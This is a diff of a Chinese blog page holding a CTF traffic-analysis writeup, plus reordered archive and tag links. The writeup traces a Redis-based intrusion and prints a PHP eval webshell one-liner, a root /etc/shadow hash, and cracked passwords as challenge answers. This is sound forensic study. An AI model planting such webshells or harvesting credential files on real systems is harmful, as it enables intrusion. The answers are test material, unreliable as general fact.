@@ -236,7 +236,7 @@
 <p>从而得到了答案<br>我们不难想起来，第二台服务器开了6379端口，即redis服务，所以我个人认为，黑客应该是通过打redis获取root权限，然后向第二台机子写入的小马<br>那么既然是打redis，我们过滤http流量肯定是不行的，所以这里选择过滤tcp<br>不难找到以下攻击<br><img src="/images/6.1022.png"><br>可见黑客的确反弹了shell，获取了权限<br>然后黑客进行了大量操作<br><img src="/images/6.1023.png"><br>其中不难发现，黑客查看了敏感文件/etc/shadow，并写入了shell:indexs.php<br><img src="/images/6.1024.png"><br>其中root信息为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:$6$pJIpnrap9xQnDvB/$dGJnXpT1mMIzAD7K0WiE12rKVRgqCleL9u528e/Bgc2AIblZ3I1bDXfkLZhFehU/C3eCt/il35tiQP1DFccVO0:17030:0:99999:7:::</span><br></pre></td></tr></table></figure></p>
 <p>这里对<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$6$pJIpnrap9xQnDvB/$dGJnXpT1mMIzAD7K0WiE12rKVRgqCleL9u528e/Bgc2AIblZ3I1bDXfkLZhFehU/C3eCt/il35tiQP1DFccVO0</span><br></pre></td></tr></table></figure></p>
 <p>爆破无果，后来跳过该题目才知道，竟然是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Simplexue123</span><br></pre></td></tr></table></figure></p>
-<p>竟然还带着点猜和脑洞，好吧~<br>但是这一系列的操作里，我们得到了许多后续答案<br>我们整理一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&gt;15.黑客在服务器2中查看了哪个敏感文件(拿到shell之后)，请写出绝对路径  </span><br><span class="line">/etc/shadow  </span><br><span class="line">&gt;17.黑客在redis未授权访问中反弹shell的ip和端口是多少  </span><br><span class="line">202.1.1.2/6666</span><br><span class="line">&gt;18.黑客拿到root权限后执行的第二条命令是什么  </span><br><span class="line">cd /var/www/html</span><br><span class="line">&gt;19.服务器2的root用户密码是什么  </span><br><span class="line">Simplexue123  </span><br><span class="line">&gt;20.黑客向服务器2写入webshell的命令</span><br><span class="line">echo &apos;&lt;?php eval($_POST[a]);&apos;&gt;indexs.php </span><br><span class="line">``` </span><br><span class="line">然后是最后剩下的两个题目，关于服务器2的管理员密码，我们在第6个数据包里不难发现黑客读取的内容</span><br><span class="line">这里过滤选择关键词admin或者root都可以</span><br><span class="line">&lt;img src=&quot;/images/6.1025.png&quot;&gt; </span><br><span class="line">解md5后得到管理员密码</span><br><span class="line">112233.com</span><br><span class="line">最后得到答案</span><br><span class="line">admin/112233.com</span><br><span class="line">关于最后一个题，比较难受，我们是谷歌到的特征，关于无偿arp包，其isgratuitous必须为true</span><br><span class="line">故此挨个过滤每个数据包</span><br></pre></td></tr></table></figure></p>
+<p>竟然还带着点猜和脑洞，好吧~<br>但是这一系列的操作里，我们得到了许多后续答案<br>我们整理一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">15.黑客在服务器2中查看了哪个敏感文件(拿到shell之后)，请写出绝对路径  </span><br><span class="line">/etc/shadow  </span><br><span class="line">17.黑客在redis未授权访问中反弹shell的ip和端口是多少  </span><br><span class="line">202.1.1.2/6666</span><br><span class="line">18.黑客拿到root权限后执行的第二条命令是什么  </span><br><span class="line">cd /var/www/html</span><br><span class="line">19.服务器2的root用户密码是什么  </span><br><span class="line">Simplexue123  </span><br><span class="line">20.黑客向服务器2写入webshell的命令</span><br><span class="line">echo &apos;&lt;?php eval($_POST[a]);&apos;&gt;indexs.php </span><br><span class="line">``` </span><br><span class="line">然后是最后剩下的两个题目，关于服务器2的管理员密码，我们在第6个数据包里不难发现黑客读取的内容</span><br><span class="line">这里过滤选择关键词admin或者root都可以</span><br><span class="line">&lt;img src=&quot;/images/6.1025.png&quot;&gt; </span><br><span class="line">解md5后得到管理员密码</span><br><span class="line">112233.com</span><br><span class="line">最后得到答案</span><br><span class="line">admin/112233.com</span><br><span class="line">关于最后一个题，比较难受，我们是谷歌到的特征，关于无偿arp包，其isgratuitous必须为true</span><br><span class="line">故此挨个过滤每个数据包</span><br></pre></td></tr></table></figure></p>
 <p>arp &amp;&amp; arp.isgratuitous == true<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;/images/6.1026.png&quot;&gt; </span><br><span class="line">依次查看，即可得到答案</span><br></pre></td></tr></table></figure></p>
 <p>192.168.3.213<br>192.168.3.6<br>192.168.3.19<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 题目答案</span><br></pre></td></tr></table></figure></p>
 <blockquote>
@@ -2389,46 +2389,6 @@
     
     
     
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     <div class="total-archive"> Total : 114 </div>
     
     <div class="post-archive">
@@ -2501,12 +2461,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/21</span><a class="archive-post-title" href= "/2018/04/21/数据分析-企业渗透过程/" >数据分析-企业渗透过程</a>
+            <span class="archive-post-date">04/21</span><a class="archive-post-title" href= "/2018/04/21/流量分析-CTF题目实战/" >流量分析-CTF题目实战</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/21</span><a class="archive-post-title" href= "/2018/04/21/流量分析-CTF题目实战/" >流量分析-CTF题目实战</a>
+            <span class="archive-post-date">04/21</span><a class="archive-post-title" href= "/2018/04/21/数据分析-企业渗透过程/" >数据分析-企业渗透过程</a>
         </li>
     
     
@@ -2626,12 +2586,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/27</span><a class="archive-post-title" href= "/2018/01/27/有点意思的3道web题/" >有点意思的3道web题</a>
+            <span class="archive-post-date">01/27</span><a class="archive-post-title" href= "/2018/01/27/最近复现的几个CVE题目/" >最近复现的几个CVE题目</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/27</span><a class="archive-post-title" href= "/2018/01/27/最近复现的几个CVE题目/" >最近复现的几个CVE题目</a>
+            <span class="archive-post-date">01/27</span><a class="archive-post-title" href= "/2018/01/27/有点意思的3道web题/" >有点意思的3道web题</a>
         </li>
     
     
@@ -2995,7 +2955,7 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/椭圆加密算法ECC/" >椭圆加密算法ECC</a>
+            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/CBC字节翻转攻击/" >CBC字节翻转攻击</a>
         </li>
     
     
@@ -3005,12 +2965,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/CUMTCTF-初赛/" >CUMTCTF-初赛</a>
+            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/椭圆加密算法ECC/" >椭圆加密算法ECC</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/CBC字节翻转攻击/" >CBC字节翻转攻击</a>
+            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/CUMTCTF-初赛/" >CUMTCTF-初赛</a>
         </li>
     
     
@@ -3027,9 +2987,9 @@
     
         <span class="sidebar-tag-name"><a href= "#">CBC</a></span>
     
-        <span class="sidebar-tag-name"><a href= "#">serialize</a></span>
-    
         <span class="sidebar-tag-name"><a href= "#">CRC</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">serialize</a></span>
     
         <span class="sidebar-tag-name"><a href= "#">hexo</a></span>
     
@@ -3039,17 +2999,17 @@
     
         <span class="sidebar-tag-name"><a href= "#">ssrf</a></span>
     
-        <span class="sidebar-tag-name"><a href= "#">cms</a></span>
-    
         <span class="sidebar-tag-name"><a href= "#">xss</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">cms</a></span>
     
         <span class="sidebar-tag-name"><a href= "#">docker</a></span>
     
         <span class="sidebar-tag-name"><a href= "#">.git</a></span>
     
-        <span class="sidebar-tag-name"><a href= "#">crypto</a></span>
-    
         <span class="sidebar-tag-name"><a href= "#">writeup</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">crypto</a></span>
     
         <span class="sidebar-tag-name"><a href= "#">sql</a></span>
     
@@ -3073,9 +3033,9 @@
     
         <span class="sidebar-tag-name"><a href= "#">微机实验</a></span>
     
-        <span class="sidebar-tag-name"><a href= "#">马原考试</a></span>
-    
         <span class="sidebar-tag-name"><a href= "#">微机考试</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">马原考试</a></span>
     
         <span class="sidebar-tag-name"><a href= "#">微机实验考试</a></span>
     
